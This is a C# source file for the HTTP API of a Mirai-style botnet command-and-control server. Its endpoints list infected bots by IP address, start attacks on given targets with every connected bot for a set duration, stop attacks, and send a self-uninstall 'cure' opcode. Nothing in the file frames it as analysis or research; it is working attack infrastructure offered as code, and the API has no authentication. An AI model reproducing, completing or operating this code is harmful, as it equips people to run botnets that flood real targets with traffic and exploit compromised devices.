using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using Newtonsoft.Json;
using Serilog;

namespace MiraiCnCServer
{
  public class ApiServer
  {
    private readonly BotManager botManager;
    private readonly AttackCoordinator attackCoordinator;
    private readonly DatabaseManager database;
    private readonly int port;
    private HttpListener? listener;

    public ApiServer(BotManager bm, AttackCoordinator ac, DatabaseManager db, int p)
    {
      botManager = bm;
      attackCoordinator = ac;
      database = db;
      port = p;
    }

    public async Task StartAsync()
    {
      listener = new HttpListener();
      listener.Prefixes.Add($"http://+:{port}/");

      try
      {
        listener.Start();
        Log.Information($"[API] HTTP API started on port {port}");

        while (true)
        {
          var context = await listener.GetContextAsync();
          _ = Task.Run(() => HandleRequest(context));
        }
      }
      catch (Exception ex)
      {
        Log.Error(ex, "[API] Error in API server");
      }
    }

    private async Task HandleRequest(HttpListenerContext context)
    {
      var request = context.Request;
      var response = context.Response;

      // Enable CORS for GUI
      response.AddHeader("Access-Control-Allow-Origin", "*");
      response.AddHeader("Access-Control-Allow-Methods", "GET, POST, DELETE, OPTIONS");
      response.AddHeader("Access-Control-Allow-Headers", "Content-Type");

      if (request.HttpMethod == "OPTIONS")
      {
        response.StatusCode = 200;
        response.Close();
        return;
      }

      try
      {
        var path = request.Url?.AbsolutePath ?? "/";
        Log.Debug($"[API] {request.HttpMethod} {path}");

        object? result = path switch
        {
          "/api/bots" => HandleGetBots(),
          "/api/bots/stats" => HandleGetBotStats(),
          "/api/bots/remove" when request.HttpMethod == "POST" => await HandleRemoveBot(request),
          "/api/bots/cure" when request.HttpMethod == "POST" => await HandleCureBot(request),
          "/api/attacks" => HandleGetAttacks(),
          "/api/attacks/start" when request.HttpMethod == "POST" => await HandleStartAttack(request),
          "/api/attacks/stop" when request.HttpMethod == "POST" => await HandleStopAttack(request),
          "/api/attacks/stopall" when request.HttpMethod == "POST" => HandleStopAllAttacks(),
          "/api/status" => HandleGetStatus(),
          _ => new { error = "Not found" }
        };

        var json = JsonConvert.SerializeObject(result, Formatting.Indented);
        var buffer = Encoding.UTF8.GetBytes(json);

        response.ContentType = "application/json";
        response.ContentLength64 = buffer.Length;
        response.StatusCode = 200;

        await response.OutputStream.WriteAsync(buffer, 0, buffer.Length);
      }
      catch (Exception ex)
      {
        Log.Error(ex, "[API] Error handling request");

        var error = JsonConvert.SerializeObject(new { error = ex.Message });
        var buffer = Encoding.UTF8.GetBytes(error);

        response.StatusCode = 500;
        response.ContentType = "application/json";
        await response.OutputStream.WriteAsync(buffer, 0, buffer.Length);
      }
      finally
      {
        response.Close();
      }
    }

    private object HandleGetBots()
    {
      var bots = botManager.GetAllBots().Select(b => new
      {
        id = b.Id,
        ip = b.IpAddress,
        version = b.Version,
        source = b.Source,
        connected_at = b.ConnectedAt,
        last_ping = b.LastPing,
        is_connected = b.IsConnected,
        uptime_seconds = (DateTime.UtcNow - b.ConnectedAt).TotalSeconds
      }).ToList();

      return new { success = true, count = bots.Count, bots };
    }

    private object HandleGetBotStats()
    {
      return new { success = true, stats = botManager.GetStatistics() };
    }

    private async Task<object> HandleRemoveBot(HttpListenerRequest request)
    {
      using var reader = new StreamReader(request.InputStream);
      var body = await reader.ReadToEndAsync();
      var data = JsonConvert.DeserializeObject<Dictionary<string, string>>(body);

      if (data == null || !data.ContainsKey("bot_id"))
        return new { success = false, error = "Missing bot_id" };

      var botId = data["bot_id"];
      var bot = botManager.GetBotById(botId);

      if (bot == null)
        return new { success = false, error = "Bot not found" };

      Log.Information($"[API] Removing bot {bot.IpAddress} (ID: {botId})");

      // Disconnect the bot
      bot.Disconnect();
      await botManager.RemoveBotAsync(bot);
      await database.LogBotRemovalAsync(botId, bot.IpAddress, "manual_disconnect");

      return new { success = true, message = $"Bot {bot.IpAddress} disconnected" };
    }

    private async Task<object> HandleCureBot(HttpListenerRequest request)
    {
      using var reader = new StreamReader(request.InputStream);
      var body = await reader.ReadToEndAsync();
      var data = JsonConvert.DeserializeObject<Dictionary<string, string>>(body);

      if (data == null || !data.ContainsKey("bot_id"))
        return new { success = false, error = "Missing bot_id" };

      var botId = data["bot_id"];
      var bot = botManager.GetBotById(botId);

      if (bot == null)
        return new { success = false, error = "Bot not found" };

      Log.Information($"[API] Curing bot {bot.IpAddress} (ID: {botId})");

      // Send cure command - this tells the bot to uninstall itself
      var cureCommand = BuildCureCommand();
      bot.QueueAttackCommand(cureCommand);

      // Give it time to process
      await Task.Delay(1000);

      // Then disconnect
      bot.Disconnect();
      await botManager.RemoveBotAsync(bot);
      await database.LogBotRemovalAsync(botId, bot.IpAddress, "cure");

      return new
      {
        success = true,
        message = $"Cure command sent to {bot.IpAddress}",
        details = "Bot will self-destruct and clean up files"
      };
    }

    private byte[] BuildCureCommand()
    {
      // Special cure opcode (0xFE) tells bot to:
      // 1. Stop all attacks
      // 2. Kill all spawned processes
      // 3. Delete its executable
      // 4. Disconnect and exit

      using var ms = new MemoryStream();
      using var writer = new BinaryWriter(ms);

      writer.Write((byte)0xFE); // Cure opcode
      writer.Write((byte)0x01); // Version
      writer.Write((byte)0x00); // Flags
      writer.Write((byte)0x00); // Reserved

      return ms.ToArray();
    }

    private object HandleGetAttacks()
    {
      var attacks = attackCoordinator.GetActiveAttacks().Select(a => new
      {
        id = a.Id,
        name = a.Name,
        type = a.Type.ToString(),
        targets = a.Targets,
        duration = a.Duration,
        start_time = a.StartTime,
        bot_count = a.BotCount,
        seconds_remaining = a.SecondsRemaining,
        progress_percent = a.ProgressPercent
      }).ToList();

      return new { success = true, count = attacks.Count, attacks };
    }

    private async Task<object> HandleStartAttack(HttpListenerRequest request)
    {
      using var reader = new StreamReader(request.InputStream);
      var body = await reader.ReadToEndAsync();
      var data = JsonConvert.DeserializeObject<AttackRequest>(body);

      if (data == null)
        return new { success = false, error = "Invalid request" };

      Log.Information($"[API] Starting attack: {data.Name}");

      var type = Enum.Parse<AttackType>(data.Type);
      var options = data.Options ?? new Dictionary<string, string>();

      var command = attackCoordinator.BuildAttackCommand(type, data.Targets, data.Duration, options);
      var bots = botManager.GetAllBots();

      await botManager.SendAttackToAll(command);

      var attackId = attackCoordinator.StartAttack(
          data.Name,
          type,
          data.Targets,
          data.Duration,
          options,
          bots.Count
      );

      return new
      {
        success = true,
        attack_id = attackId,
        bots_used = bots.Count,
        message = $"Attack started with {bots.Count} bots"
      };
    }

    private async Task<object> HandleStopAttack(HttpListenerRequest request)
    {
      using var reader = new StreamReader(request.InputStream);
      var body = await reader.ReadToEndAsync();
      var data = JsonConvert.DeserializeObject<Dictionary<string, int>>(body);

      if (data == null || !data.ContainsKey("attack_id"))
        return new { success = false, error = "Missing attack_id" };

      var stopped = attackCoordinator.StopAttack(data["attack_id"]);

      if (stopped)
      {
        await botManager.KillAllAttacksAsync();
        return new { success = true, message = "Attack stopped" };
      }

      return new { success = false, error = "Attack not found" };
    }

    private object HandleStopAllAttacks()
    {
      attackCoordinator.StopAllAttacks();
      _ = botManager.KillAllAttacksAsync();

      return new { success = true, message = "All attacks stopped" };
    }

    private object HandleGetStatus()
    {
      var stats = botManager.GetStatistics();
      var attacks = attackCoordinator.GetActiveAttacks();

      return new
      {
        success = true,
        server_time = DateTime.UtcNow,
        active_bots = botManager.ActiveBotCount,
        total_bots_ever = botManager.TotalBotsEver,
        active_attacks = attacks.Count,
        stats
      };
    }
  }

  public class AttackRequest
  {
    public string Name { get; set; } = "";
    public string Type { get; set; } = "";
    public List<string> Targets { get; set; } = new();
    public int Duration { get; set; }
    public Dictionary<string, string>? Options { get; set; }
  }
}
